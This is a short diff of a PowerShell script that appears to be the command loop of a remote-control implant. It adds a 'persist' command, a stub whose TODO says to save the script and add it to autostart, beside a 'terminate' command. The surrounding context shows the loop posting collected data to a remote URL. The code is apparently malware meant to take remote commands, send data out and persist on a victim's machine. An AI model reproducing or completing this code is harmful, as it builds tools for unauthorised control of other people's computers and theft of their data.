@@ -43,6 +43,9 @@ for (;;){
                         
             Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
 
+        } elseif ($command -eq "persist"){
+	        exit # TODO: save somewhere and add to autostart
+
         } elseif ($command -eq "terminate"){
 	        exit
         }
